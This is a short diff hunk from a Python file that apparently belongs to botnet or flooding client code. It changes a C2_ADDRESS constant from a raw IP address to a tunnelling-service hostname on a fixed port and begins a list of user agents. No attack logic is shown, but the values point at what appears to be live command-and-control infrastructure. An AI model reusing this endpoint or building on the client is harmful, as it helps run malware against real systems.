@@ -3,7 +3,7 @@ import threading
 import time
 import random
 
-C2_ADDRESS  = "147.185.221.224"
+C2_ADDRESS  = "anti-referrals.craft.ply.gg"
 C2_PORT     = 12893
 
 base_user_agents = [
